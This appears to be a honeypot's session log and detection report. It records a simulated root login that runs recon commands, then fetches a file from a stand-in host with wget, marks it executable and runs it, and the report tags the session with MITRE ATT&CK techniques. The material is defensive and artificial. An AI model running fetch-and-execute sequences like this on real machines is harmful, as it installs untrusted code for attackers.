─── session: ed33d941-ddd6-4c0b-a242-84a17b9b15a5 ─────────────────────────────
peer: 127.0.0.1:43202 | user: root | persona: linux | duration: 12.7s | 8 cmds

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root

$ uname -a
Linux prod-db-03 5.15.0-107-generic #117-Ubuntu SMP ...

$ wget http://example.com/test -O /tmp/test
--2026-05-22 18:20:03--  http://example.com/test
Resolving example.com (example.com)... 53.105.106.70
Connecting to example.com (example.com)|53.105.106.70|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1256 (1.2K) [text/html]
Saving to: '/tmp/test'

 0K .                                                   100% 0.00B/s

'/tmp/test' saved [1256/1.2K]

$ chmod +x /tmp/test
$ /tmp/test
Hello from honeypot simulation

$ sudo -l
User root may run the following commands on prod-db-03:
    (ALL : ALL) ALL

$ exit
Connection closed.

─── TTPs detected ─────────────────────────────────────────────────────────────
T1105 (HIGH)  Ingress Tool Transfer          — wget http://example.com/test
T1222 (MED)   File Permission Modification   — chmod +x /tmp/test

─── log events ────────────────────────────────────────────────────────────────
{"event":"connect","sid":"ed33d941-...","peer":"127.0.0.1:43202","persona":"linux"}
{"event":"auth",   "user":"root","password":"","persona":"linux"}
{"event":"cmd","cmd":"id","ttps":[],"urls":[]}
{"event":"cmd","cmd":"whoami","ttps":[],"urls":[]}
{"event":"cmd","cmd":"uname -a","ttps":[],"urls":[]}
{"event":"cmd","cmd":"wget http://example.com/test -O /tmp/test","ttps":[{"mitre":"T1105","label":"Ingress Tool Transfer","severity":"HIGH"}],"urls":["http://example.com/test"]}
{"event":"cmd","cmd":"chmod +x /tmp/test","ttps":[{"mitre":"T1222","label":"File Permission Modification","severity":"MED"}],"urls":[]}
{"event":"cmd","cmd":"/tmp/test","ttps":[],"urls":[]}
{"event":"cmd","cmd":"sudo -l","ttps":[],"urls":[]}
{"event":"cmd","cmd":"exit","ttps":[],"urls":[]}
{"event":"session_end","cmd_count":8,"ttp_count":2,"unique_ttps":["T1105","T1222"],"narrative":"127.0.0.1:43202 (root) | 8 cmds over 13s | Kill chain: Recon → Tool download → Staged execution"}
